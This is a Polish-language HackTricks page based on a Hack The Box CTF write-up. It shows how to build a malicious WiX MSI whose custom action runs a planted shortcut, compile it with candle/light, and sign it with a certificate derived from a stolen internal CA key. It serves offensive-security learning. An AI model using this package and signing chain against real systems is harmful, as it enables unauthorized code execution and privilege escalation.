# Tworzenie MSI z Custom-Action za pomocą WiX

{{#include ../../banners/hacktricks-training.md}}

Ten historyczny chain z Hack The Box wykorzystywał WiX Toolset v3 do zbudowania MSI, który uruchamiał wcześniej umieszczony plik `.lnk`. **MSI nie ma automatycznie podwyższonych uprawnień**: wykonanie odbywa się w kontekście określonym przez zasady Windows Installer, atrybuty custom-action oraz użytkownika, który je instaluje. W przytoczonym scenariuszu attacker ukradł również zaufany signing CA i umieścił podpisany MSI w folderze monitorowanym przez innego użytkownika.<sup>[[1]](#references)[[3]](#references)</sup>

Aby kompleksowo zrozumieć przykłady użycia wix MSI, zaleca się zapoznanie z [tą stroną](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Znajdują się tam różne przykłady demonstrujące użycie wix MSI.<sup>[[2]](#references)</sup>

MSI uruchamia `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Oryginalny kod XML WiX v3 został zachowany poniżej:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` deklaruje minimalną wersję Windows Installer, a `Compressed="yes"` oznacza, że pakiet jest skompresowany. `Stage1` jest odroczony, ale ma `Impersonate="yes"`, więc uruchamia się z tokenem personifikacji użytkownika wykonującego instalację; zmiana uprawnień w tym scenariuszu nastąpiła dzięki uprzywilejowanemu użytkownikowi, który później otworzył plik MSI, a nie dlatego, że ten atrybut magicznie nadaje uprawnienia SYSTEM.<sup>[[3]](#references)</sup>

Skompiluj źródło do obiektu WiX za pomocą `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Połącz ten obiekt z plikiem MSI za pomocą `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Etap podpisywania użyty w pierwotnym łańcuchu

Docelowy workflow akceptował pakiety podpisane przez zaatakowany wewnętrzny CA. W opisie wyprowadzono certyfikat podpisywania na podstawie odzyskanych plików `MyCA.cer`/`MyCA.pvk`, utworzono plik PFX i podpisano MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Następnie attacker umieścił podpisany package w `D:\DEV\MSIs` i czekał, aż uprzywilejowany workflow/użytkownik go wykona. Zachowaj ten warunek wstępny podczas adaptowania techniki: bez uprzywilejowanej ścieżki instalacji, niebezpiecznej policy, takiej jak `AlwaysInstallElevated`, lub uprzywilejowanej ofiary ten package zostanie wykonany wyłącznie z uprawnieniami bieżącego użytkownika.

## References

- [1] [Hack The Box - Ethereal: Tworzenie złośliwego msi i uzyskanie root - Blog 0xRick's](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Krótkie wprowadzenie: Tworzenie instalatora MSI za pomocą WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Niestandardowe akcje z odroczonym wykonaniem (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
